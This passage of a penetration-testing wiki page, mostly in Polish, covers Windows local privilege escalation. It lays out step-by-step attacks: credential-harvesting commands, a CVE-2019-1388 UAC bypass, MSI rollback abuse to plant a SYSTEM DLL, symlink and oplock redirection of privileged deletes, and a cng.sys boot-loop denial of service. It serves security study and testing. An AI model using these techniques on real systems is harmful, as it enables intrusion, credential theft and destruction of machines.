[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Stworzyłem ten plugin, aby **automatycznie uruchamiać wszystkie metasploit POST module, które wyszukują credentials** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające passwords wspomniane na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) jest kolejnym świetnym narzędziem do wydobywania password z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** z wielu narzędzi, które zapisują te dane w postaci czystego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Wyobraź sobie, że **proces uruchomiony jako SYSTEM open a new process** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Wówczas, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przechwycić **open handle to the privileged process created** z `OpenProcess()` i **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, referred to as **pipes**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję nazwaną **Named Pipes**, pozwalającą niezwiązanym procesom na współdzielenie danych, nawet w różnych sieciach. Przypomina to architekturę klient/serwer, z rolami definiowanymi jako **named pipe server** i **named pipe client**.

Kiedy dane są wysyłane przez pipe przez **client**, **server** który utworzył pipe ma możliwość **przejęcia tożsamości** **clienta**, o ile posiada wymagane prawa **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się przez pipe, który możesz podszyć, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie w interakcję z utworzonym przez Ciebie pipe'em. Instrukcje wykonania takiego ataku można znaleźć [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Ponadto następujące narzędzie pozwala **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zobacz stronę **[https://filesec.io/](https://filesec.io/)**

### **Monitorowanie linii poleceń pod kątem haseł**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. Poniższy skrypt co dwie sekundy captures process command lines i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez console lub RDP) i UAC jest włączone, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub dowolnego innego procesu, takiego jak "NT\AUTHORITY SYSTEM", z nieuprzywilejowanego konta.

Umożliwia to eskalację uprawnień i jednoczesne obejście UAC tą samą podatnością. Dodatkowo nie ma potrzeby instalowania czegokolwiek, a binary używany podczas procesu jest podpisany i wydany przez Microsoft.

Niektóre z podatnych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, konieczne jest wykonanie następujących kroków:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Atak polega zasadniczo na nadużyciu funkcji rollback Windows Installer, aby zastąpić legalne pliki złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi stworzyć **malicious MSI installer**, który zostanie użyty do przejęcia folderu `C:\Config.Msi`, który później Windows Installer użyje do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI — tam pliki rollback zostaną zmodyfikowane, aby zawierać złośliwy ładunek.

Skrócona technika wygląda następująco:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **metadane indeksu** folderu.

Zatem, jeśli usuniesz **strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z systemu plików.

Możesz to zrobić, używając standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mimo że wywołujesz *file* delete API, to **usuwa sam folder**.

### Od Folder Contents Delete do SYSTEM EoP
Co jeśli twój prymityw nie pozwala na usunięcie dowolnych plików/folderów, ale **pozwala na usunięcie *zawartości* folderu kontrolowanego przez atakującego**?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock triggers** i przekazuje kontrolę twojemu callbackowi.

4. Krok 4: Wewnątrz oplock callbacka – przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` gdzie indziej
- To opróżnia `folder1` bez zerwania oplocka.
- Nie usuwaj `file1.txt` bezpośrednio — to by zwolniło oplock przedwcześnie.

- Opcja B: Konwertuj `folder1` na **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Celuje w wewnętrzny strumień NTFS, który przechowuje metadane folderu — jego usunięcie usuwa folder.

5. Krok 5: Zwolnij oplock
- Proces SYSTEM kontynuuje i próbuje usunąć `file1.txt`.
- Ale teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Wynik**: `C:\Config.Msi` jest usuwany przez SYSTEM.

### Od Arbitrary Folder Create do Permanent DoS

Wykorzystaj prymityw, który pozwala ci **create an arbitrary folder as SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** lub **ustawić słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz ją uprzednio jako folder**, Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widząc folder, **nie udaje mu się zlokalizować właściwego sterownika**, i **system ulega awarii lub rozruch jest zatrzymany**.
- Nie ma **żadnego obejścia**, i **brak możliwości odzyskania** bez zewnętrznej interwencji (np. naprawa rozruchu lub dostęp do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych + OM symlinks do arbitrary file overwrite / boot DoS

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty do ścieżki odczytywanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **Object Manager symlinks + NTFS mount points**, aby zamienić zapis uprzywilejowany na arbitrary overwrite (nawet **bez** SeCreateSymbolicLinkPrivilege).

**Wymagania**
- Plik konfiguracyjny przechowujący docelową ścieżkę jest zapisywalny przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia mount point do `\RPC Control` oraz OM file symlinku (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Uprzywilejowana operacja, która zapisuje do tej ścieżki (log, export, report).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić docelową ścieżkę logów uprzywilejowanej usługi, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj tę ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wywołuje "send test SMS"). Zapis trafia teraz do `C:\Windows\System32\cng.sys`.
4. Zbadaj nadpisany cel (hex/PE parser), aby potwierdzić uszkodzenie; restart wymusza, aby Windows załadował zmodyfikowaną ścieżkę sterownika → **boot loop DoS**. To działa również w odniesieniu do dowolnego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia istnieje w `C:\Windows\System32\cng.sys`, może być sprawdzana jako pierwsza, co czyni ją niezawodnym DoS sinkiem dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli już działasz w procesie o High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Tworząc service binary upewnij się, że to prawidłowa service lub że binary wykonuje niezbędne operacje wystarczająco szybko — w przeciwnym razie zostanie zakończony po 20s, jeśli nie jest prawidłową service.

### AlwaysInstallElevated

Z procesu o poziomie High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell używając wrappera _**.msi**_.\
[Więcej informacji o kluczach rejestru i jak zainstalować pakiet _.msi_ tutaj.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz je w już istniejącym procesie o poziomie High Integrity), będziesz w stanie **otworzyć prawie dowolny proces** (niechronione procesy) z uprawnieniem SeDebug, **skopiować token** procesu i stworzyć **dowolny proces z tym tokenem**.\
Przy użyciu tej techniki zwykle **wybierany jest proces uruchomiony jako SYSTEM posiadający wszystkie uprawnienia tokena** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**Możesz znaleźć** [**przykład kodu wykonującego proponowaną technikę tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technika ta jest używana przez meterpreter do eskalacji w `getsystem`. Polega na **utworzeniu pipe i następnie stworzeniu/nadużyciu service, aby zapisać do tego pipe'a**. Następnie, **server** który utworzył pipe używając uprawnienia **`SeImpersonate`** będzie mógł **podszyć się pod token** klienta pipe'a (service) i uzyskać uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes przeczytaj to**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**jak przejść z high integrity do System używając name pipes przeczytaj to**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **hijack a dll** ładowaną przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również użyteczny przy tego typu eskalacji uprawnień, a ponadto jest znacznie **łatwiejszy do osiągnięcia z procesu o poziomie High Integrity**, ponieważ będzie miał **write permissions** do folderów używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Najlepsze narzędzie do wyszukiwania Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza misconfigurations i sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza możliwe misconfigurations i zbiera informacje (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane sesje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyciąga credentials z Credential Manager. Wykryte.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozprowadza zebrane hasła po domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa privesc Windows enumeracja**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalna weryfikacja **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane privesc vulnerabilities (wymaga kompilacji przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu misconfigurations (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyciąga credentials z wielu programów (precompiled exe w github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Sprawdza misconfiguration (wykonywalny precompiled w github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe misconfigurations (exe z pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na bazie tego posta (nie potrzebuje accesschk, żeby działać poprawnie, ale może go użyć).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje output z **systeminfo** i rekomenduje działające exploity (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje output z **systeminfo** i rekomenduje działające exploity (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt używając odpowiedniej wersji .NET ([zobacz to](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary możesz zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Źródła

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
